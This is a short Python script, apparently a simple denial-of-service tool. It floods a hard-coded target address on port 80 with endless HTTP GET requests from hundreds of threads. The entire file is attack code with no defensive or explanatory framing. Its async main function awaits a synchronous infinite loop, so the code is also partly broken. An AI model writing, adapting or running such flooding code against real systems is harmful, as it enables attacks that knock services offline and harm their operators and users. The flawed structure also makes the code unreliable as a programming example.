import socket
import threading
import asyncio

target = '192.168.86.40'
port = 80


def http_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            print("[MESSAGE] " + target + " " + str(port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            print("[!] Sent")
            s.close()
        except Exception as e:
            print("Error", e)


async def main():
    for i in range(500):
        thread = threading.Thread(target=http_flood)
        thread.start()
        await http_flood()
    print("Done")

if __name__ == '__main__':
    asyncio.run(main())